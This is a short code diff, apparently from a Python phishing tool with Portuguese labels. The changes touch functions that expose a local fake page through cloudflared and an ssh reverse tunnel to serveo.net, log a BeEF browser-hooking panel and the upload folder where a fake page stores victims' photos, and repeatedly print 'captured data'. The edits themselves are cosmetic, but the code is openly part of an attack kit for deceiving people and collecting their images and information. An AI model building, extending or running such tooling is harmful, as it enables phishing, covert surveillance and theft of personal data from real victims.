@@ -118,7 +118,7 @@ def get_cloudflared_link():
         return None, None
 
 def get_serveo_link():
-    with managed_process(["ssh", "-o", "StrictHostKeyChecking=no", "-R", "80:localhost:3000", "serveo.net"],
+    with managed_process(["ssh", "-R", "80:localhost:3000", "serveo.net"],
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE,
                         text=True) as process:
@@ -226,6 +226,8 @@ def start_attack(egs_type, model):
         logger.info(line)
     for line in format_link("Beef se inciado:.....", f"http://127.0.0.1"):
         logger.info(line)
+    for line in format_link("Local das fotos:.....", f"/var/www/htm/page-fake/uploads"):
+        logger.info(line)
 
     logger.info(f"{YELLOW}+{'-'*box_width}+{NC}")
 
@@ -244,9 +246,8 @@ def monitor_data(file):
                     logger.info(f"{YELLOW}| {'Dados Capturados'.center(58)} |{NC}")
                     logger.info(f"{YELLOW}+{'-'*60}+{NC}")
                     for line in data.split('\n'):
-                        logger.info(f"{YELLOW}| {line:<58} |{NC}")
-                    logger.info(f"{YELLOW}+{'-'*60}+{NC}")
-        time.sleep(15)
+                        logger.info(f"{YELLOW} {line:<58} {NC}")
+        time.sleep(20)
 
 def show_menu(title, options):
     clear_screen()
